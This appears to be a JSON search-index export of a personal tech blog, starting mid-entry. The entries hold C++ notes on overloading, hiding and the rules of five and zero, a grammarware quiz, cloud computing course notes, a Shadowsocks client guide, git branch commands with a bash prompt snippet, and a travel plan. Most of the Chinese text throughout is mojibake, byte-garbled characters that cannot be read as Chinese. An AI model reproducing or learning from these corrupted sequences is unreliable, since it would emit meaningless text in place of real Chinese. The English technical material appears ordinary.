//pCæ˜¯æŒ‡å‘constå¯¹è±¡çš„æŒ‡é’ˆï¼Œå°†è°ƒç”¨constç‰ˆæœ¬çš„gå‡½æ•° Base::g(Other\u0026amp;) const //pCCPæ˜¯æŒ‡å‘constå¯¹è±¡çš„constæŒ‡é’ˆï¼Œä¹Ÿè°ƒç”¨constç‰ˆæœ¬çš„gå‡½æ•° Base::g(Other\u0026amp;) //pCPæ˜¯æŒ‡å‘écosntå¯¹è±¡çš„constæŒ‡é’ˆï¼Œç”±äºä¸æŒ‡å‘constå¯¹è±¡ï¼Œè°ƒç”¨éconstç‰ˆæœ¬çš„gå‡½æ•° ä¸Šè¿°ç»“æœï¼Œæ˜¯å¦å’Œé¢„æƒ³çš„æ˜¯å¦åˆæœ‰äº›å‡ºå…¥å‘¢ï¼Ÿé—®é¢˜ä¸»è¦é›†ä¸­äºç»“æœçš„ç¬¬5ã€12ã€13å’Œ15è¡Œã€‚\nç¬¬5è¡Œè¾“å‡ºç»“æœè¯æ˜ï¼šå½“å‡½æ•°å‚æ•°æœ‰é»˜è®¤å€¼ï¼Œåˆå‘ç”Ÿå¤šæ€è¡Œä¸ºæ—¶ï¼Œå‡½æ•°å‚æ•°é»˜è®¤å€¼æ˜¯é™æ€è¡Œä¸ºï¼Œåœ¨ç¼–è¯‘æ—¶å°±å·²ç»ç¡®å®šï¼Œå°†ä½¿ç”¨åŸºç±»ç‰ˆæœ¬çš„å‡½æ•°å‚æ•°é»˜è®¤å€¼è€Œä¸æ˜¯å­ç±»çš„ã€‚\nè€Œç¬¬12ã€13ã€15è¡Œè¾“å‡ºç»“æœåˆ™è¯´æ˜ï¼Œå°½ç®¡å·²ç»è¯æ˜æˆ‘ä»¬ä¹‹å‰è¯´çš„éšè—æ˜¯æ­£ç¡®çš„ï¼ˆå› ä¸ºd.g(o)ä¸å¯ä»¥é€šè¿‡ç¼–è¯‘ï¼Œç¡®å®å‘ç”Ÿäº†éšè—ï¼‰ï¼Œä½†å´å¯ä»¥**åˆ©ç”¨åŸºç±»æŒ‡é’ˆæŒ‡å‘æ´¾ç”Ÿç±»å¯¹è±¡åï¼Œæ¥ç»•å¼€è¿™ç§é™åˆ¶ï¼**ä¹Ÿå°±æ˜¯è¯´ï¼Œç¼–è¯‘å™¨æ ¹æ®å‚æ•°åŒ¹é…å‡½æ•°åŸå‹çš„æ—¶å€™ï¼Œæ˜¯åœ¨ç¼–è¯‘æ—¶æ ¹æ®æŒ‡é’ˆçš„ç±»å‹ï¼Œæˆ–å¯¹è±¡çš„ç±»å‹æ¥ç¡®å®šï¼ŒæŒ‡é’ˆç±»å‹æ˜¯åŸºç±»ï¼Œé‚£ä¹ˆåŸºç±»ä¸­çš„gå‡½æ•°ç‰ˆæœ¬å°±æ˜¯å¯è§çš„ï¼›æŒ‡é’ˆç±»å‹æ˜¯å­ç±»ï¼Œç”±äºå‘ç”Ÿäº†éšè—ï¼ŒåŸºç±»ä¸­çš„gå‡½æ•°ç‰ˆæœ¬å°±æ˜¯ä¸å¯è§çš„ã€‚è€Œåˆ°åŠ¨æ€ç»‘å®šæ—¶ï¼ŒåŸºç±»æŒ‡é’ˆæŒ‡å‘äº†å­ç±»å¯¹è±¡ï¼Œåœ¨å­ç±»å¯¹è±¡çš„è™šå‡½æ•°è¡¨ä¸­ï¼Œå°±å¯ä»¥æ‰¾åˆ°åŸºç±»ä¸­gè™šå‡½æ•°çš„åœ°å€ã€‚\nå†™åˆ°è¿™é‡Œï¼Œä¸çŸ¥é“è¯»è€…æ˜¯å¦å·²ç»æ˜ç™½ï¼Œè¿™äº›ç»•æ¥ç»•å»çš„å…³ç³»ã€‚åœ¨å®é™…ä»£ç è¿ç”¨ä¸­ï¼Œå¯èƒ½å¹¶ä¸ä¼šå†™å‡ºå«æœ‰è¿™ä¹ˆå¤šâ€œé™·é˜±â€çš„æµ‹è¯•ä»£ç ï¼Œæˆ‘ä»¬åªè¦å¼„æ¸…æ¥šé‡è½½ã€è¦†ç›–å’Œéšè—çš„å…·ä½“ç‰¹å¾ï¼Œå¹¶å¤´è„‘æ¸…é†’åœ°çŸ¥é“ï¼Œæˆ‘ç°åœ¨éœ€è¦çš„æ˜¯å“ªä¸€ç§åŠŸèƒ½ï¼ˆé€šå¸¸ä¹Ÿä¸ä¼šéœ€è¦éšè—ï¼‰ï¼Œå°±èƒ½å†™å‡ºæ¸…æçš„ä»£ç ã€‚ä¸Šé¢çš„ä»£ç å…¶å®æ˜¯ä¸€ä¸ªç³Ÿç³•çš„ä¾‹å­ï¼Œå› ä¸ºåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œé‡è½½ã€è¦†ç›–ã€éšè—å¹¶å­˜ï¼Œæˆ‘ä»¬ç¼–å†™ä»£ç ï¼Œå°±æ˜¯è¦å°½å¯èƒ½é˜²æ­¢è¿™ç§å«æ··ä¸æ¸…çš„æƒ…å†µå‘ç”Ÿã€‚\nè®°ä½ä¸€ä¸ªåŸåˆ™ï¼šæ¯ä¸€ä¸ªæ–¹æ³•ï¼ŒåŠŸèƒ½å’ŒèŒè´£å°½å¯èƒ½å•ä¸€ï¼Œå¦åˆ™ï¼Œå°è¯•å°†å®ƒæ‹†åˆ†æˆä¸ºå¤šä¸ªæ–¹æ³•ã€‚\n","date":1536142471,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536142471,"objectID":"3e91af00de70b860e8d89a9031c782ab","permalink":"http://www.guozet.me/post/C++-Rule-Of-Five/","publishdate":"2018-09-05T10:14:31Z","relpermalink":"/post/C++-Rule-Of-Five/","section":"post","summary":"Rule of five Because the presence of a user-defined destructor, copy-constructor, or copy-assignment operator prevents implicit definition of the move constructor and the move assignment operator, any class for which","tags":"C++","title":"C++ä¹‹Rule of Five","type":"post"},{"authors":null,"categories":"C++","content":" Classes that have custom destructors, copy/move constructors or copy/move assignment operators should deal exclusively with ownership (which follows from the Single Responsibility Principle). Other classes should not have custom destructors, copy/move constructors or copy/move assignment operators. [1]\nclass rule_of_zero { std::string cppstring; public: rule_of_zero(const std::string\u0026amp; arg) : cppstring(arg) {} }; When a base class is intended for polymorphic use, its destructor may have to be declared public and virtual. This blocks implicit moves (and deprecates implicit copies), and so the special member functions have to be declared as defaulted [2]\nclass base_of_five_defaults { public: base_of_five_defaults(const base_of_five_defaults\u0026amp;) = default; base_of_five_defaults(base_of_five_defaults\u0026amp;\u0026amp;) = default; base_of_five_defaults\u0026amp; operator=(const base_of_five_defaults\u0026amp;) = default; base_of_five_defaults\u0026amp; operator=(base_of_five_defaults\u0026amp;\u0026amp;) = default; virtual ~base_of_five_defaults() = default; }; however, this can be avoided if the objects of the derived class are not dynamically allocated, or are dynamically allocated only to be stored in a std::shared_ptr (such as by std::make_shared): shared pointers invoke the derived class destructor even after casting to std::shared_ptr\u0026lt;Base\u0026gt;.\n","date":1536142471,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536142471,"objectID":"8dce5be466c1bc79b84ff4c43684b846","permalink":"http://www.guozet.me/post/C++-Rule-of-Zero/","publishdate":"2018-09-05T10:14:31Z","relpermalink":"/post/C++-Rule-of-Zero/","section":"post","summary":"Classes that have custom destructors, copy/move constructors or copy/move assignment operators should deal exclusively with ownership (which follows from the Single Responsibility Principle). Other classes should not have custom destructors,","tags":"C++","title":"C++ä¹‹Rule of Zero","type":"post"},{"authors":null,"categories":"CPSC8270","content":"Quiz 1 Date: 09/06/2018\nSome questions about the paper What is grammarware? Grammarware comprises grammars and grammar-dependent software.\nWhat is Chomskys controversial definition of the â€œuniversal grammar?â€ He think that the essence of human language is the system of principles, conditions, and rules that are elements or properties of all human languages.\nBasically, whatâ€™s the â€œresearch agendaâ€ described in the paper? It promotes an engineering discipline for grammarware.\nThe authors claim that â€œGrammarware seems to be second-class software.â€ What do they mean by this? (talk about refactoring) Grammarware seems to be second-class software. For instance, program refactoring is a well-established practice according to modern object-oriented methodology. By contrast, grammar refactoring is weakly understood and hardly practiced.\nThe authors ask the question: â€œwhat is a good grammar?â€ How would you address this issue? A good grammar can help programmers to automate many tasks that are tedious and error prone when performed manually. Can help the programmers to find each set of string in the computer languages.\nDef: Formally, a grammar G is a four tu-ple (N, T, S, P) where N \u0026amp; T are disjount sets of symbols known as non-terminals and terminals, S âˆˆ N is the start symbol, and P is a relation on N âˆª T of production rules.\nN : non-terminals are generally represented as cap letters, and do not appear in the language; they are used to derive sentences in the language.\nT : terminals are symbols in the language\nS is one of the non-terminals that indicates where to start when deriving a sentence in the language.\nP : rules used to derive a sentence.\n","date":1536142471,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1536142471,"objectID":"65a06040230af65f4ebd1470994e6c21","permalink":"http://www.guozet.me/post/CPSC8270-Quiz1/","publishdate":"2018-09-05T10:14:31Z","relpermalink":"/post/CPSC8270-Quiz1/","section":"post","summary":"Quiz 1 Date: 09/06/2018 Some questions about the paper What is grammarware? Grammarware comprises grammars and grammar-dependent software. What is Chomskys controversial definition of the â€œuniv","tags":null,"title":"ç¼–è¯‘åŸç†---ç¼–è¯‘å™¨æ¦‚å¿µ","type":"post"},{"authors":null,"categories":"Courses","content":"8/23/2018\nWelcome, course overview, account setup, course logistics (20 minutes) 1.01 What is Cloud Computing (30 minutes) AWS Management Console demo Access the student materials at https://awsacademy.qwiklab.com (Links to an external site.)Links to an external site. Registration link \u0026ndash; will be provided in email to class participants AWS Getting Started (Links to an external site.)Links to an external site. Homework:\nAFTER EVERY LECTURE: Do the assessment(s) associated with the lecture slides just covered even if not listed in the Homework. Become familiar with the terms and concepts listed for each class period. For today\u0026rsquo;s lecture, do the Assessment for Lecture 1. Read Cloud computing basics (Links to an external site.)Links to an external site. Read: Taxonomy and Survey of Cloud Computing Systems (Links to an external site.)Links to an external site. and be prepared to answer questions about it on the Exam. Some terms everyone should know: on-demand self service, resource pooling, elasticity, measured service, SAAS, PAAS, IAAS, HAAS public/private/hybrid types of clouds, virtualization, hypervisor, stateful versus stateless services, cloud business model, on-premises/on-prem, enterprise application, pay as you go Introduce What is the Cloud Computing? Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g. networks, servers, applications, and services) that can be rapidly provisioned and released with minimal management effort or service provider interaction.\nSome keywords Five Characteristics On-demand self-service\nThis means provisioning or de-provisioning computing resources as needed in an automated fashion without human intervention [n. ä»‹å…¥ï¼›è°ƒåœï¼›å¦¨ç¢]. An analogy to this is electricity as a utility where a consumer can turn on or off a switch on-demand to use as much electricity as required.\nResource Pooling\nThis means that computing resources are pooled to meet the demand of the consumers so that resources (physical or virtual) can be dynamically assigned, reassigned or de-allocated as per the requirement. Generally the consumers are not aware of the exact location of computing resources. However, they may be able to specify location (country, city, region and the like) for their need. For example, I as a consumer might want to host my services with a cloud provider that has cloud data centers within the boundaries of Australia.\nUbiquitous[adj. æ™®éå­˜åœ¨çš„ï¼›æ— æ‰€ä¸åœ¨çš„] network access\nThis means that computing facilities can be accessed from anywhere over the network using any sort of thin or thick clients (for example smartphones, tablets, laptops, personal computers and so on).\nElasticity\nCloud computing provides an illusion of infinite computing resources to the users. In cloud models, resources can be elastically provisioned or released according to demand.\nMeasured service\nThis means that consumers only pay for the computing resources they have used. This concept is similar to utilities like water or electricity.\nThree main service models of cloud computing (Cloud Architecture) XaaS offerings where X is Software, Hardware, Platform, Infrastructure, Data, Business etc.\nSAAS\nSoftware as a service (SaaS). Applications hosted by a provider on a cloud infrastructure are accessed from thin or thick clients over the network or a program interface (for example, web services). Examples are Google Docs, IBM SmartCloud Docs, IBM SmartCloud Meetings, Saleforce.comâ€™s CRM application and so on.\nPAAS\nPlatform as a service (PaaS). Providers deliver not only infrastructure but also middleware (databases, messaging engines and so on) and solution stacks for application build, development and deploy. IBM SmartCloud Application Services and Google App Engine are two examples of PaaS.\nIAAS\nInfrastructure as a service (IaaS). It is the delivery of computing infrastructure as a service. IBM SmartCloud Enterprise+, SoftLayer cloud and Amazon EC2 are some examples of IaaS.\nHAAS\nHardware as a service (HaaS) refers to managed services or grid computing, where computing power is leased from a central provider. In each case, the HaaS model is similar to other service-based models, where users rent, rather than purchase, a provider\u0026rsquo;s tech assets.\nThere are others services emanating from these main services. Storage as a service (STaaS) and communications as a service (CaaS) are two such variants.\nFour cloud deployment models( public/private/hybrid types of clouds) Public cloud\nThis is where computing resources provided by a cloud provider are used by different organizations through public Internet on a pay as you go (PAYG) model. Cloud providers ensure some sort of separation for resources used by different organizations. This is known as multitenancy [n. å¤šç§Ÿæˆ·æŠ€æœ¯].\nPrivate cloud\nThis is where cloud infrastructure is solely owned by an organization and maintained either by this organization or a third party and can be located on site or off-site. Computing resources are behind the corporate firewall.\nCommunity cloud\nHere, cloud infrastructure is owned and shared by multiple organizations with a shared concern.\nHybrid cloud\nIt is the combination of any type of cloud model mentioned above connected by standardized or proprietary technology.\nVirtualization Virtualization Management is the technology that abstracts the coupling between the hardware and operating system. It refers to the abstraction of logical resources away from their underlying physical resources in order to improve agility, flexibility, reduce costs and thus enhance busines valuse. Basically virtualizations in cloud are of different types such as server virtualization, storage virtuualization and network virtualization.\nFor example, a common interpretation of server virtualization is the mapping of single physical resources to multiple logical representations or partitions.\nHypervisor Weâ€™ve heard the term hypervisor, of course, when talking of virtualization and the Cloud. Hypervisors allow a single set of physical hardware to host multiple virtual machines, and hold all of the necessary variables and information required to make those virtual machines work. But what is a Hypervisor actually, what does a Hypervisor do, and how does it make the Cloud possible? Letâ€™s have a look:\nIn their simplest form, hypervisors are software, specialized firmware, or both which allow physical hardware to be shared across multiple virtual machines. The way the hypervisor does this will vary from vendor to vendor â€“ like ESXi from WMware or Hyper-V from Microsoft, but they all accomplish the same task. Each takes one set of physical hardware (CPU, RAM, disk drives, peripherals, etc.) and allows it to be simultaneously used by multiple instances of Operating Systems (Windows, Linux, etc.).\nThere are two major classifications of hypervisors to be aware of. Type 1 and Type 2 both do the same basic task, but the way they do it is quite different from each other.\nstateful versus stateless services I assume you are referring to Security Groups (stateful) and Access Control Lists (stateless) in Ryan\u0026rsquo;s videos. My understanding is:\nSecurity Groups control connectivity to and from an EC2 instance or instances whereas ACLs control connectivity to and from a subnet.\nStateful = any connection inbound will also allow the response to be returned outbound without additional rules or will override an explicit DENY.\nStateless = you must explicitly ALLOW traffic in both directions.\ncloud business model on-premises/on-prem On-premises software (sometimes misspelled \u0026ldquo;on-premise\u0026rdquo; or abbreviated as \u0026ldquo;on-prem\u0026rdquo;) is installed and runs on computers on the premises (in the building) of the person or organization using the software, rather than at a remote facility such as a server farm or cloud. On-premises software is sometimes referred to as â€œshrinkwrapâ€ software, and off-premises software is commonly called â€œsoftware as a serviceâ€ (\u0026ldquo;SaaS\u0026rdquo;) or â€œcloud computingâ€.\nenterprise application Enterprise application integration is an integration framework composed of a collection of technologies and services which form a middleware or \u0026ldquo;middleware framework\u0026rdquo; to enable integration of systems and applications across an enterprise.\npay as you go Pay-as-you-go cloud computing (PAYG cloud computing) is a payment method for cloud computing that charges based on usage. The practice is similar to that of utility bills, using only resources that are needed.\nSome websites links There are some courses on this website. - AWS Training\nAWS lab: awsacademy.qwiklabs.com Use lab on this website Aws Core services Elastic Load Balancing, Amazon CloudWatch, and Auto Scaling.\nElastic Load Balancing(ELB)\u0026ndash; Traffic cop(äº¤é€šè­¦å¯Ÿ) ELB can automatically distributes incoming application traffic across multiple targets(Like Amazon EC2 Instances, Containers, and IP address).\nHow to distribute traffic across ELB Auto Scaling to launch and release servers How CloudWatch enables you to monitor AWS resources and applications in real time.","date":1535364871,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1535364871,"objectID":"581781e2ed694bb5be2a288738111c04","permalink":"http://www.guozet.me/post/Cloud-Computing-introduce/","publishdate":"2018-08-27T10:14:31Z","relpermalink":"/post/Cloud-Computing-introduce/","section":"post","summary":"8/23/2018\nWelcome, course overview, account setup, course logistics (20 minutes) 1.01 What is Cloud Computing (30 minutes) AWS Management Console demo Access the student materials at https://awsacademy.qwiklab.com (Links to an external site.)Links to an external site. Registration link \u0026ndash; will be provided in email to class participants AWS Getting Started (Links to an external site.)Links to an external site. Homework:\nAFTER EVERY LECTURE: Do the assessment(s) associated with the lecture slides just covered even if not listed in the Homework. Become familiar with the terms and concepts listed for each class period. For today\u0026rsquo;s lecture, do the Assessment for Lecture 1. Read Cloud computing basics (Links to an external site.)Links to an external site. Read: Taxonomy and Survey of Cloud Computing Systems (Links to an external site.)Links to an external site. and be prepared to answer questions about it on the Exam. Some terms everyone should know: on-demand self service, resource pooling, elasticity, measured service, SAAS, PAAS, IAAS, HAAS public/private/hybrid types of clouds, virtualization, hypervisor, stateful versus stateless services, cloud business model, on-premises/on-prem, enterprise application, pay as you go Introduce What is the Cloud Computing? Cloud computing is a model for enabling convenient, on-demand network access to a shared pool of configurable computing resources (e.g. networks, servers, applications, and services) that can be rapidly provisioned and released with minimal management effort or service provider interaction.\n","tags":"Cloud Computing","title":"Courses Cloud Computing Introduce 1","type":"post"},{"authors":null,"categories":"vpn","content":"Shadowsocksä½¿ç”¨æ•™ç¨‹ æµè§ˆå™¨æ’ä»¶ ä¾ç„¶è®°å¾—è‡ªå·±ä½¿ç”¨ã€Œçº¢æã€çš„ç•…å¿«ä½“éªŒâ”€â”€å“ªä¸ªç½‘ç«™ä¸èƒ½è®¿é—®äº†ï¼ŒæŒ‰ä¸‹å›¾æ ‡æ·»åŠ åˆ°è§„åˆ™åˆ—è¡¨ä¸­ï¼Œå°±å¯ä»¥ã€Œç§‘å­¦ã€åœ°è®¿é—®äº†ã€‚è¿™ç§æ— ç¼çš„ä½“éªŒï¼Œé  Shadowsocks åŠ å¦ä¸€æ¬¾ Chrome æ‰©å±• SwitchyOmega ä¹Ÿèƒ½å®ç°ï¼Œè¿™é‡Œæ˜¯ ä½¿ç”¨æ•™ç¨‹ã€‚\nWindowsæ¡Œé¢åº”ç”¨ éƒ¨ç½² Shadowsocks å®Œæˆåï¼Œæµè§ˆå™¨å°±èƒ½å®ç°ç§‘å­¦ä¸Šç½‘äº†ï¼Œä½†æ˜¯åƒ Dropbox ç­‰æ¡Œé¢åº”ç”¨çš„æµé‡ï¼Œè¿˜ä¸èƒ½ç”± Shadowsocks æ¥ä»£ç†ã€‚è¦å®ç°æ¡Œé¢åº”ç”¨çš„ä»£ç†ï¼Œéœ€è¦å†å€ŸåŠ©å…¶ä»–åº”ç”¨ï¼Œæ¯”å¦‚ Proxifierã€ Surge for Macã€‚\næ‰‹æœºç«¯åº”ç”¨ å®‰å“æ‰‹æœºåªéœ€è¦ä¸‹è½½å®‰è£… Shadowsocks å®‰å“ç‰ˆï¼Œå¹¶ä¸æ¡Œé¢ç‰ˆä¸€æ ·ï¼Œå¡«å…¥æœåŠ¡å™¨ IPã€ç«¯å£ã€å¯†ç å’ŒåŠ å¯†æ–¹å¼ï¼Œå°±å¯ä»¥è®¾ç½®å…¨å±€æˆ–åˆ†åº”ç”¨ä»£ç†ã€‚ä½†æ˜¯è¦å®ç°ã€ŒçœŸæ­£æ„ä¹‰ä¸Šã€çš„ PAC è§„åˆ™çš„è¯ï¼ˆä¹Ÿå°±æ˜¯è‡ªå®šä¹‰å“ªäº›åŸŸåèµ°ä»£ç†ã€å“ªäº›ä¸èµ°ï¼‰ï¼Œç›®å‰ä¼¼ä¹è¿˜æ²¡æœ‰ä¸€ä¸ªä¾¿æ·å¯è¡Œçš„è§£å†³æ–¹æ¡ˆã€‚\niOS å¯ä»¥é€šè¿‡ç±» Surge çš„ App å®ç° PAC è§„åˆ™ä¸‹çš„è‡ªåŠ¨ç¿»å¢™ã€‚\nSurge ç›®å‰å®šä»· 328 å…ƒï¼Œå¦æœ‰ Mac ç‰ˆï¼ˆå¦å¤–æ”¶è´¹ï¼‰ã€‚ä½œä¸ºä¸€æ¬¾å…¼å…·ã€Œç§‘å­¦ä¸Šç½‘ã€åŠŸèƒ½çš„ç½‘ç»œå¼€å‘è°ƒè¯•åˆ©å™¨ï¼Œå®ƒå®Œå…¨å€¼è¿™ä¸ªä»·ã€‚è§‰å¾—å¤ªè´µçš„è¯ï¼Œå¯ä»¥ä½¿ç”¨ç›¸å¯¹ä¾¿å®œçš„ Wingy æˆ–è€… Potatsoï¼Œä¸è¿‡äºŒè€…éƒ½æ²¡æœ‰å‰è€…æ¥å¾—ç¨³å®šå¥½ç”¨ã€‚\n","date":1535040871,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1535040871,"objectID":"49b5d1834691ba80b74d1532ca172779","permalink":"http://www.guozet.me/post/vpn-client/","publishdate":"2018-08-23T16:14:31Z","relpermalink":"/post/vpn-client/","section":"post","summary":"Shadowsocksä½¿ç”¨æ•™ç¨‹ æµè§ˆå™¨æ’ä»¶ ä¾ç„¶è®°å¾—è‡ªå·±ä½¿ç”¨ã€Œçº¢","tags":"vpn","title":"vpn-Shadowsocksä½¿ç”¨æ•™ç¨‹","type":"post"},{"authors":null,"categories":"Leetcode","content":"\nI have solved SOLVEDNUMBER / 1020 problems. I use this page to record the questions which I did on the Leetcode.\nLast Updated: UPDATETIMESTAMP\nPlease access my Leetcode Gitbook to git all posts about leetcode.\nThis table include: Question Number, Questions Name, Question Difficulty, Question Type, And when I did it.\n# Title Difficulty Topics ","date":1534467759,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1534467759,"objectID":"d832c2b44aff1b1b246f3dad7f4bde97","permalink":"http://www.guozet.me/post/All-Leetcode/","publishdate":"2018-08-17T01:02:39Z","relpermalink":"/post/All-Leetcode/","section":"post","summary":"\nI have solved SOLVEDNUMBER / 1020 problems. I use this page to record the questions which I did on the Leetcode.\nLast Updated: UPDATETIMESTAMP\nPlease access my Leetcode Gitbook to git all posts about leetcode.\nThis table include: Question Number, Questions Name, Question Difficulty, Question Type, And when I did it.\n","tags":"Leetcode","title":"Leetcode Solutions(Updating)","type":"post"},{"authors":null,"categories":"Blog","content":" å¾ˆå¤šæ—¶å€™æˆ‘ä»¬æ˜¯éœ€è¦åœ¨ä¸åŒçš„ç”µè„‘ä¸Šé¢ä¹¦å†™æˆ‘ä»¬çš„åšå®¢ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½è¦é…ç½®Hexoçš„ç¯å¢ƒçš„è¯ï¼Œè¿™å°±æ˜¯ä¸€ä»¶éå¸¸å´©æºƒçš„äº‹æƒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åˆ©ç”¨æˆ‘ä»¬çš„çŸ¥è¯†å®Œæˆè‡ªåŠ¨åŒ–éƒ¨ç½²ã€‚\nåŸç†ï¼š åœ¨githubä¸Šé¢åˆ›å»ºBlogçš„repo, ä½¿ç”¨masteråˆ†æ”¯ä½œä¸ºåšå®¢åˆ†æ”¯ï¼Œä½¿ç”¨hexoæ¥ä½œä¸ºæºæ–‡ä»¶ä¿å­˜åˆ†æ”¯ï¼Œå°†è¯¥repoçš„token key æä¾›ç»™Travisä¹‹åï¼ŒTravis CIå¹³å°æ£€æµ‹ä½ çš„hexoåˆ†æ”¯æ•°æ®å˜åŒ–çš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œä½ å®šä¹‰çš„è„šæœ¬ã€‚ï¼ˆåœ¨è¿™ä¸ªè„šæœ¬ä¸­ï¼Œå®Œæˆåšå®¢å‘å¸ƒçš„å†…å®¹ï¼‰\nä½¿ç”¨Travis CI 2018-08-09-hexo-and-travisci-to-implement-auto-setting_2018-08-09-14-36-40.png\n","date":1533824054,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1533824054,"objectID":"846cee2cb2d5d48a49e1360260b2750e","permalink":"http://www.guozet.me/post/hexo-and-travisci-to-implement-auto-setting/","publishdate":"2018-08-09T14:14:14Z","relpermalink":"/post/hexo-and-travisci-to-implement-auto-setting/","section":"post","summary":"å¾ˆå¤šæ—¶å€™æˆ‘ä»¬æ˜¯éœ€è¦åœ¨ä¸åŒçš„ç”µè„‘ä¸Šé¢ä¹¦å†™æˆ‘ä»¬çš„åšå®¢ï¼Œä½†æ˜¯æ¯æ¬¡éƒ½","tags":["Hexo","Github","Travis"],"title":"Hexo+Github+Travis CIå®Œæˆåšå®¢çš„è‡ªåŠ¨éƒ¨ç½²","type":"post"},{"authors":null,"categories":"Git","content":"Git command Branch operation Background: We often want the copy the master branch(or other branch) to develop a new function. $git checkout master //Change to the master branch or which branch you want to copy\r$git pull //ä»è¿œç«¯æ‹‰å–æœ€æ–°ç‰ˆæœ¬\r$git checkout -b NewBranch //Switched to a new branch 'NewBranch'\r$git push origin NewBranch //æ–°å»ºåˆ†æ”¯NewBranchåˆ°è¿œç«¯\rIssues git pull error $git pull\rThere is no tracking information for the current branch.\rPlease specify which branch you want to merge with.\rSee git-pull(1) for details.\rgit pull \u0026lt;remote\u0026gt; \u0026lt;branch\u0026gt;\rIf you wish to set tracking information for this branch you can do so with:\rgit branch --set-upstream-to=origin/\u0026lt;branch\u0026gt; NewBranch\rsolution $git branch --set-upstream-to=origin/NewBranch $git pull $git push origin test:test\nGit configure on Ubuntu Add git branch name if its present Open ~/.bashrc file, add the code followed this paragraph after the default prompt definition and unset color_prompt force_color_prompt. You also can replace the the default prompt definition with the snippet or leave your ~/.bashrc as it is and comment the default prompt definition along with unset color_prompt force_color_prompt.\n# Add git branch if its present to PS1\rparse_git_branch() {\rgit branch 2\u0026gt; /dev/null | sed -e '/^[^*]/d' -e 's/* \\(.*\\)/(\\1)/'\r}\rif [ \u0026quot;$color_prompt\u0026quot; = yes ]; then\rPS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[01;31m\\]$(parse_git_branch)\\[\\033[00m\\]\\$ '\relse\rPS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w$(parse_git_branch)\\$ '\rfi\rreplace\nif [ \u0026quot;$color_prompt\u0026quot; = yes ]; then\rPS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\relse\rPS1='${debian_chroot:+($debian_chroot)}\\u@\\h:\\w\\$ '\rfi\rWhich ends with:\nunset color_prompt force_color_prompt\r","date":1533822130,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1533822130,"objectID":"2939ffff39047dff52d4b7e687354823","permalink":"http://www.guozet.me/post/How-to-config-git-on-Ubuntu/","publishdate":"2018-08-09T13:42:10Z","relpermalink":"/post/How-to-config-git-on-Ubuntu/","section":"post","summary":"Git command Branch operation Background: We often want the copy the master branch(or other branch) to develop a new function. $git checkout master //Change to the master branch or which branch you want to copy\r$git pull //ä»è¿œç«¯æ‹‰å–æœ€æ–°ç‰ˆæœ¬\r$git checkout -b NewBranch //Switched to a new branch 'NewBranch'\r$git push origin NewBranch //æ–°å»ºåˆ†æ”¯NewBranchåˆ°è¿œç«¯\r","tags":"Git","title":"How to config git on Ubuntu","type":"post"},{"authors":null,"categories":"Travel","content":"è¿™æ¬¡å¾ˆæ—©å°±è®¡åˆ’äº†å…«æœˆä»½åˆ°å¥¥å…°å¤šçš„æ—…è¡Œï¼Œæ­£å¥½è¿™æ®µæ—¶é—´æˆ‘åœ¨æš‘æœŸè¯¾ç¨‹å’Œç§‹å­£è¯¾ç¨‹çš„ä¸­é—´ç©ºé—²æ—¶é—´ï¼Œå¥¹ä¹Ÿä½¿ç”¨ä¸¤å¤©ç—…å‡ï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨å¥¥å…°å¤šæœ‰å®Œæ•´çš„ä¸‰å¤©å¯ä»¥æ¸¸ç©äº†ã€‚\nè¡Œç¨‹å®‰æ’ æˆ‘ä»¬åœ¨å¥¥å…°å¤šçš„æ¸¸ç©æ—¶é—´åªæœ‰ä¸‰å¤©ï¼Œç¬¬ä¸€å¤©æ¸¸ç©è¿ªæ–¯å°¼Magic Kingdom Pack ï¼Œåé¢ä¸¤å¤©æ¸¸ç©Universal Studios \u0026amp; Islands of Adventure ã€‚\næ—¶é—´ è¡Œç¨‹ D1(23:30,08/10) æŠµè¾¾å¥¥å…°å¤šæœºåœº(æˆ‘ä»Atlanta -\u0026gt; Orlando, å¥¹ä»Hartford-\u0026gt;Orlando)) D2(08/11) è¿ªæ–¯å°¼Magic Kingdom Pack D3(08/12) Universal Studios \u0026amp; Islands of Adventure D4(08/13) Universal Studios \u0026amp; Islands of Adventure D5(07:30,08/14) ç¦»å¼€å¥¥å…°å¤š æ—…è¡Œå‰çš„å‡†å¤‡ é—¨ç¥¨è´­ä¹° è¿ªæ–¯å°¼çš„é—¨ç¥¨åœ¨å®˜ç½‘è´­ä¹°å³å¯ï¼Œæˆ‘ä»¬é€‰æ‹©çš„æ˜¯Magic kingdom pack, é€‰æ‹©è¿™ä¸ªçš„åŸå› ä¸»è¦æ˜¯å¥³æœ‹å‹æ¯”è¾ƒå–œæ¬¢ç±³å¥‡ï¼Œç„¶åæˆ‘ä»¬å¯¹å¤ªå°å­©å­çš„å›­åŒºå¹¶ä¸æ„Ÿå…´è¶£ã€‚ç¯çƒå½±åŸæˆ‘ä»¬é€‰æ‹©äº†Universal studios å’ŒIslands of Adventure parkçš„Two days 2-parks tickets.å› ä¸ºæˆ‘ä»¬å¾ˆæƒ³å»ä½“éªŒèƒ½å¤Ÿè¿æ¥ä¸¤ä¸ªå²›çš„å°ç«è½¦ã€‚\nTips: æˆ‘ä»¬çš„universal studio çš„ Two days 2-pars ticketæ˜¯åœ¨é£çŒªä¸Šå»è´­ä¹°çš„ï¼Œæ¯”å®˜ç½‘æ¯å¼ ç¥¨ä¾¿å®œ40åˆ€å·¦å³. 